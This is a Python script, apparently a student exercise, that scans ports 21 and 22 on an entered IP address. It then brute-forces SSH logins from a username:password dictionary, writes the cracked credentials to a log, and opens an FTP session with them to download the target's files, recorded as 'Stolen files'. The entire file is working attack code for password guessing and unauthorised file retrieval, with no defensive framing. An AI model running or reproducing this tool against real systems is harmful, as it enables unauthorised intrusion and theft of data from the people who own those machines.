import paramiko
import sys
import os
import threading
from queue import Queue
import time
import socket
import logging
import ftplib
checker = False
correctPass='none'
correctUser= 'none'

# a print_lock is what is used to prevent "double" modification of shared variables.
# this is used so while one thread is using a variable, others cannot access
# it. Once done, the thread releases the print_lock.
# to use it, you want to specify a print_lock per thing you wish to print_lock.
print_lock = threading.Lock()

target = input('enter ip to scan :')
file_name = 'part6.txt'
f = open(file_name, 'w+')
f.write("The scan result on ip:")
f.write(str(target))
f.write(' :\n')
f.close()




def portscan(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
            con = s.connect((target,port))
            with print_lock:
                global checker
                print('port :',port,' open!\n')
                if port == 21:
                    checker=1
                file_name = 'part6.txt'
                f = open(file_name, 'a+')  # open file in append mode=add text and not run it over, +=creat the file
                f.write('port :')
                f.write(str(port))
                if port == 22:
                    f.write(' SSH! ')
                f.write(' open!\n')
                f.close()
                s.close()
    except:
        print('port :',port,' close!\n')
        file_name = 'part6.txt'
        f = open(file_name, 'a+')  # open file in append mode=add text and not run it over, +=creat the file
        f.write('port :')
        f.write(str(port))
        f.write(' close!\n')
        f.close()
       # pass


# The threader thread pulls an worker from the queue and processes it
def threader():
    while True:
        # gets an worker from the queue
        worker = q.get()

        # Run the example job with the avail worker in queue (thread)
        portscan(worker)

        # completed with the job
        q.task_done()



        

# Create the queue and threader 
q = Queue()

# how many threads are we going to allow for
for x in range(2):
     t = threading.Thread(target=threader)

     # classifying as a daemon, so they will die when the main dies
     t.daemon = True

     # begins, must come after daemon definition
     t.start()
     


start = time.time()

# 100 jobs assigned,first 1000 ports
for worker in range(21,23):
    q.put(worker)

# wait until the thread terminates.
q.join()
if checker==1:
    ip=target; filename="C:\\Users\\user\\Desktop\\part 3\\dict.txt"

    fd = open(filename, "r")

    def attempt(IP,UserName,Password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(IP, username=UserName, password=Password)
        except paramiko.AuthenticationException:
            print ('[-] %s:%s fail!' % (UserName, Password))
        else:
            print ('[!] %s:%s is CORRECT!' % (UserName, Password))
            global correctUser
            global correctPass
            global checker
            correctUser = UserName 
            correctPass = Password
            checker = 2
            file_name = 'part6.txt'
            f = open(file_name, 'a+')  # open file in append mode=add text and not run it over, +=creat the file
            f.write('\n\n')
            f.write('the user name:')
            f.write(correctUser)
            f.write(' the password:')
            f.write(correctPass)
            f.write('\n\n')
            f.write('Stolen files:')
            f.close()
        ssh.close()
        return

    print ('[+] Bruteforcing against %s with dictionary %s' % (ip, filename))
    for line in fd.readlines():
        username, password = line.strip().split(":")
        t = threading.Thread(target=attempt, args=(ip,username,password))
       # t =( target = attempt, args=(ip,username,password)))
        t.start()
        time.sleep(0.3)
        t.join()
       
        
    fd.close()
else:
    print('sorry port 21 is close')
if checker==2:
    #print('ip=',target,'  username=',correctUser,'  pass=',correctPass)
    def ftp_connect():
        while True:
            site_address = target
            user_name = correctUser
            pass_name = correctPass
            try:
                with ftplib.FTP(site_address) as ftp:
                    ftp.login(user=user_name, passwd=pass_name)
                    print(ftp.getwelcome())
                    print('Current Directory', ftp.pwd())
                    ftp.dir()
                    print('Valid commands are cd/get/ls/exit - ex: get readme.txt')
                    ftp_command(ftp)
                    break  # once ftp_command() exits, end this function (exit program)
            except ftplib.all_errors as e:
                print('Failed to connect, check your address and credentials.', e)


    def ftp_command(ftp):
        while True:  # Run until 'exit' command is received from user
            command = input('Enter a command: ')
            commands = command.split()  # split command and file/directory into list

            if commands[0] == 'cd': # Change directory
                try:
                    ftp.cwd(commands[1])
                    print('Directory of', ftp.pwd())
                    ftp.dir()
                    print('Current Directory', ftp.pwd())
                except ftplib.error_perm as e:  # Handle 550 (not found / no permission error)
                    error_code = str(e).split(None, 1)
                    if error_code[0] == '550':
                        print(error_code[1], 'Directory may not exist or you may not have permission to view it.')
            elif commands[0] == 'get':  # Download file
                try:
                    ftp.retrbinary('RETR ' + commands[1], open(commands[1], 'wb').write)
                    print('File successfully downloaded.')
                    file_name = 'part6.txt'
                    f = open(file_name, 'a+')  # open file in append mode=add text and not run it over, +=creat the file
                    f.write('\n')
                    f.write(commands[1])
                    f.close
                except ftplib.error_perm as e:  # Handle 550 (not found / no permission error)
                    error_code = str(e).split(None, 1)
                    if error_code[0] == '550':
                        print(error_code[1], 'File may not exist or you may have not permission to view it.')
            elif commands[0] == 'ls':  # Print directory listing
                print('Directory of', ftp.pwd())
                ftp.dir()
            elif commands[0] == 'exit':  # Exit application
                ftp.quit()
                print('Goodbye!')
                break
            else:
                print('Invalid command, try again (valid options: cd/get/ls/exit).')

    print('Welcome to :',target,' computer enjoy!')
    ftp_connect()
else:
    print('sorry password didnt found')
